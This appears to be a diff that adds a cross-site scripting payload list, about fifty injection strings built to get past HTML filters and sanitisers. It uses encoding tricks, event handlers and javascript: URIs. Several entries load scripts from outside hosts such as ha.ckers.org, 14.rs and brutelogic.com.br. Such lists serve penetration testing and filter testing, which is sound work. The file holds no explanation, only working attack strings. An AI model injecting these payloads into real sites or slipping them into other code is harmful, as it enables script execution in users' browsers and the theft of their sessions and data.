@@ -1,0 +1,52 @@
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14; javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://google.com"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://google.com"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=http://google.com <
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="livescript:[code]">
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+";a=prompt,a()//
+"><iframe%20src="http://google.com"%%203E
+"><img src=1 onerror=alert(1)>.gif
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+"><script src=data:&comma;alert(1)//
+"><svg onload=alert(1)//
